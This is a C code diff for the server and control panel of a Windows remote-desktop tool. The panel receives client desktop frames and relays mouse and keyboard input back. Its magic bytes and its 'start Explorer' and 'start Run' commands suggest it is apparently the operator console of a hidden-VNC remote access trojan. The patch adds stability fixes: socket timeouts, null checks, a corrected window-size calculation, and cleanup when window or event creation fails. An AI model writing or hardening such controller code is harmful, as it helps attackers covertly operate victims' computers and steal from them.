@@ -43,6 +43,7 @@ static const COLORREF gc_trans              = RGB(255, 174, 201);
 static const BYTE     gc_magik[]            = { 'M', 'E', 'L', 'T', 'E', 'D', 0 };
 static const DWORD    gc_maxClients         = 256;
 static const DWORD    gc_sleepNotRecvPixels = 33;
+static const DWORD    gc_socketTimeoutMs    = 5000;
 
 static const DWORD    gc_minWindowWidth  = 800;
 static const DWORD    gc_minWindowHeight = 600;
@@ -81,6 +82,14 @@ static void GetPeerIp(SOCKET s, char *ip, int ipSize)
 
    if(!ip[0])
       lstrcpynA(ip, "unknown", ipSize);
+}
+
+static void ConfigureSocketTimeouts(SOCKET s)
+{
+   DWORD timeout = gc_socketTimeoutMs;
+   // Keep receive operations blocking. The input channel may legitimately sit idle
+   // until the user clicks or types, but sends should not block the UI forever.
+   setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char *) &timeout, sizeof(timeout));
 }
 
 static DWORD CreateSessionId()
@@ -189,10 +198,22 @@ static BOOL SendInputMessage(SOCKET s, UINT msg, WPARAM wParam, LPARAM lParam)
 
 static void SendClientInput(Client *client, UINT msg, WPARAM wParam, LPARAM lParam)
 {
+   SOCKET inputSocket = INVALID_SOCKET;
+   HWND   hWnd = NULL;
+
    EnterCriticalSection(&g_critSec);
-   if(!SendInputMessage(client->connections[Connection::input], msg, wParam, lParam))
-      PostQuitMessage(0);
+   if(client && client->connections[Connection::input])
+   {
+      inputSocket = client->connections[Connection::input];
+      hWnd = client->hWnd;
+   }
    LeaveCriticalSection(&g_critSec);
+
+   if(inputSocket == INVALID_SOCKET)
+      return;
+
+   if(!SendInputMessage(inputSocket, msg, wParam, lParam) && hWnd)
+      PostMessage(hWnd, WM_CLOSE, 0, 0);
 }
 
 static void ToggleFullscreen(HWND hWnd, Client *client)
@@ -213,7 +234,7 @@ static void ToggleFullscreen(HWND hWnd, Client *client)
          HWND_NOTOPMOST,
          client->windowedRect.left,
          client->windowedRect.top,
-         client->windowedRect.left - client->windowedRect.right,
+         client->windowedRect.right - client->windowedRect.left,
          client->windowedRect.bottom - client->windowedRect.top,
          SWP_SHOWWINDOW);
    }
@@ -244,6 +265,9 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
       }
       case WM_SYSCOMMAND:
       {
+         if(!client)
+            return DefWindowProc(hWnd, msg, wParam, lParam);
+
 /*
          if(wParam == SysMenuIds::fullScreen || (wParam == SC_KEYMENU && toupper(lParam) == 'F'))
          {
@@ -254,7 +278,8 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
          switch(wParam)
          {
             case SC_RESTORE:
-               SetEvent(client->minEvent);
+               if(client->minEvent)
+                  SetEvent(client->minEvent);
                return DefWindowProc(hWnd, msg, wParam, lParam);
             case SysMenuIds::startExplorer:
             case SysMenuIds::startRun:
@@ -285,15 +310,19 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
          rect.top = 0;
          rect.right = clientRect.right;
          rect.bottom = clientRect.bottom;
+         FillRect(hDc, &rect, hBrush);
 
-         rect.left = client->pixelsWidth;
-         FillRect(hDc, &rect, hBrush);
-         rect.left = 0;
-         rect.top = client->pixelsHeight;
-         FillRect(hDc, &rect, hBrush);
+         if(client && client->hDcBmp && client->pixelsWidth && client->pixelsHeight)
+         {
+            BitBlt(hDc, 0, 0, client->pixelsWidth, client->pixelsHeight, client->hDcBmp, 0, 0, SRCCOPY);
+         }
+         else
+         {
+            SetTextColor(hDc, RGB(220, 220, 220));
+            SetBkMode(hDc, TRANSPARENT);
+            DrawText(hDc, TEXT("Waiting for first desktop frame..."), -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+         }
          DeleteObject(hBrush);
-
-         BitBlt(hDc, 0, 0, client->pixelsWidth, client->pixelsHeight, client->hDcBmp, 0, 0, SRCCOPY);
          EndPaint(hWnd, &ps);
          break;
       }
@@ -316,6 +345,9 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
       case WM_MOUSEMOVE:
       case WM_MOUSEWHEEL:
       {
+         if(!client || !client->pixelsWidth || !client->pixelsHeight || !client->screenWidth || !client->screenHeight)
+            break;
+
          if(msg == WM_MOUSEMOVE && GetKeyState(VK_LBUTTON) >= 0)
             break;
 
@@ -333,6 +365,8 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
       }
       case WM_CHAR:
       {
+         if(!client)
+            break;
          if(iscntrl(wParam))
             break;
          SendClientInput(client, msg, wParam, 0);
@@ -341,6 +375,9 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
       case WM_KEYDOWN:
       case WM_KEYUP:
       {
+         if(!client)
+            break;
+
          switch(wParam)
          {
             case VK_UP:
@@ -665,7 +702,7 @@ exit:
          client->connections[Connection::desktop] == s &&
          client->hWnd)
       {
-         PostMessage(client->hWnd, WM_DESTROY, NULL, NULL);
+         PostMessage(client->hWnd, WM_CLOSE, 0, 0);
       }
       LeaveCriticalSection(&g_critSec);
       return 0;
@@ -715,13 +752,26 @@ exit:
          if(client->hWnd)
             wprintf(TEXT("[+] Control window created for %hs: hwnd=0x%p\n"), ip, client->hWnd);
          else
+         {
             wprintf(TEXT("[!] Control window creation failed for %hs: GetLastError=%lu\n"), ip, GetLastError());
+            closesocket(s);
+            memset(client, 0, sizeof(*client));
+            LeaveCriticalSection(&g_critSec);
+            return 0;
+         }
 
          client->minEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
          if(client->minEvent)
             wprintf(TEXT("[diag] Minimize/restore event created for %hs\n"), ip);
          else
+         {
             wprintf(TEXT("[!] CreateEvent failed for %hs: GetLastError=%lu\n"), ip, GetLastError());
+            DestroyWindow(client->hWnd);
+            closesocket(s);
+            memset(client, 0, sizeof(*client));
+            LeaveCriticalSection(&g_critSec);
+            return 0;
+         }
       }
       LeaveCriticalSection(&g_critSec);
 
@@ -834,6 +884,7 @@ BOOL StartServer(int port)
          continue;
       int one = 1;
       setsockopt(s, IPPROTO_TCP, TCP_NODELAY, (const char *) &one, sizeof(one));
+      ConfigureSocketTimeouts(s);
       HANDLE h = CreateThread(NULL, 0, ClientThread, (LPVOID) s, 0, 0);
       if(h)
          CloseHandle(h);
